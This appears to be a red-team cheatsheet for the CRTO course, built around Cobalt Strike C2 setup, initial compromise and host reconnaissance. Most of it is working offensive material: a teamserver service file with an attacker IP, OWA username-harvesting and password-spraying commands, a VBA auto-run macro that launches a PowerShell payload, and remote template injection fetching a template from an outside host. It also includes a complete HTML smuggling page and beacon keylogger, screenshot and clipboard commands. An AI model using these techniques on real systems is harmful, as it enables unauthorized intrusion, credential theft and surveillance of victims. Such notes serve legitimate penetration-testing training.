# CRTO Cheatsheet

> 10.10.5.50 = Attacker IP

## C2 - Cobalt Strike

### Run Server

```bash
c```

### Run as a Service

```bash
sudo vim /etc/systemd/system/teamserver.service

## Paste this
[Unit]
Description=Cobalt Strike Team Server
After=network.target
StartLimitIntervalSec=0

[Service]
Type=simple
Restart=always
RestartSec=1
User=root
WorkingDirectory=/home/attacker/cobaltstrike
ExecStart=/home/attacker/cobaltstrike/teamserver 10.10.5.50 Passw0rd! c2-profiles/normal/webbug.profile

[Install]
WantedBy=multi-user.target

sudo systemctl daemon-reload
sudo systemctl start teamserver.service
sudo systemctl enable teamserver.service
```

### Listeners

#### HTTP

Config:

- Beacon HTTP
- HTTP Hosts o HTTP Hosts Stager: `attacker IP`
- Start 80 PORT: `sudo ss -lntp`

#### DNS

Config DNS

|Name |Type | Data |
|----------|----------|----------|
|@ 	|A 	|10.10.5.50|
|ns1 |A  |10.10.5.50|
|pics| NS |ns1.nickelviper.com.|

- DNS Hosts and DNS Hosts (Stager): `Attacker IP`

#### SMB

> `ls \\.\pipe\` to emulate a common name

- Pipename (C2): Input name

#### TCP

- Port (C2): Port 
- Bind to localhost only: optional


#### Pivot Listener

> A pivot listener can only be created on an existing Beacon, and not via the normal Listeners menu

1. Right-click on a Beacon and select Pivoting > Listener.  This will open a "New Listener" window
2. On beacon: `run netstat -anop tcp`
3. We can now generate payloads for this listener

## Initial Compromise

### Outlook

```powershell
Import-Module C:\Tools\MailSniper\MailSniper.ps1
#Enumerate the NetBIOS name 
Invoke-DomainHarvestOWA -ExchHostname mail.test.local
# Get a list of users
./namemash.py names.txt > possible.txt
# timing attack to validate which (if any) of these usernames are valid
Invoke-UsernameHarvestOWA -ExchHostname mail.test.local -Domain <NETBIOS NAME> -UserList .\Desktop\possible.txt -OutFile .\Desktop\valid.txt
# Password Spraying
Invoke-PasswordSprayOWA -ExchHostname mail.cyberbotic.io -UserList .\Desktop\valid.txt -Password Summer2022
# Get Address List
Get-GlobalAddressList -ExchHostname mail.cyberbotic.io -UserName cyberbotic.io\iyates -Password Summer2022 -OutFile .\Desktop\gal.txt
```

### Initial Access Payloads

> One significant difference (apart from how you dress it up to the user), is that any file downloaded via a browser (outside of a trusted zone) will be tainted with the "Mark of the Web" (MOTW).

```powershell
## Get Zone data of file
Get-Content .\test.txt -Stream Zone.Identifier
```
The possible zones are:

- 0 => Local computer
- 1 => Local intranet
- 2 => Trusted sites
- 3 => Internet
- 4 => Restricted sites

#### VBA Shell

> Cobalt Strike > Attacks > Scripted Web Delivery > Select Payload 

```vb
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "powershell payload here"

End Sub
```

*You save the doc `as .doc` ~~not .docx or .docm~~*

##### Remote Template Injection

Remote Template Injection is a technique where an attacker sends a benign document to a victim, which downloads and loads a malicious template.

1. Save the document as a dot file
2. 7Zip > Open archive.  Navigate to word > _rels, right-click on settings.xml.rels and select Edit.
3. Change `Target=` to `Target="http://nickelviper.com/template.dot"`

or use this tool

```bash
python3 remoteinjector.py -w http://nickelviper.com/template.dot /mnt/c/Payloads/document.docx
```

#### HTML Smuggling

```bash
cat file | base64
# And modify the file variable and the fileName
```

```html
<html>
    <head>
        <title>HTML Smuggling</title>
    </head>
    <body>
        <p>This is all the user will see...</p>

        <script>
        function convertFromBase64(base64) {
            var binary_string = window.atob(base64);
            var len = binary_string.length;
            var bytes = new Uint8Array( len );
            for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
            return bytes.buffer;
        }

        var file ='VGhpcyBpcyBhIHNtdWdnbGVkIGZpbGU=';
        var data = convertFromBase64(file);
        var blob = new Blob([data], {type: 'octet/stream'});
        var fileName = 'test.txt';

        if(window.navigator.msSaveOrOpenBlob) window.navigator.msSaveBlob(blob,fileName);
        else {
            var a = document.createElement('a');
            document.body.appendChild(a);
            a.style = 'display: none';
            var url = window.URL.createObjectURL(blob);
            a.href = url;
            a.download = fileName;
            a.click();
            window.URL.revokeObjectURL(url);
        }
        </script>
    </body>
</html>
```

#### Host Reconnaissance

```bash
# List processes
ps

# Collect Data
execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe -group=system

# Screenshots
printscreen               ##Take a single screenshot via PrintScr method
screenshot                ##Take a single screenshot
screenwatch               ##Take periodic screenshots of desktop

# Keylogger
keylogger               ## RUn keylogger
jobs                    ## List jobs
jobkill <id>               ## Kill job (keylogger)

# Clipboard
clipboard               ## Get Clipboard

# list the logon sessions on this machine
net logons
```

##### Web Categorization

- https://sitereview.bluecoat.com/
- https://github.com/mdsecactivebreach/Chameleon

## Persistence

### SharPersist

- https://github.com/mandiant/SharPersist

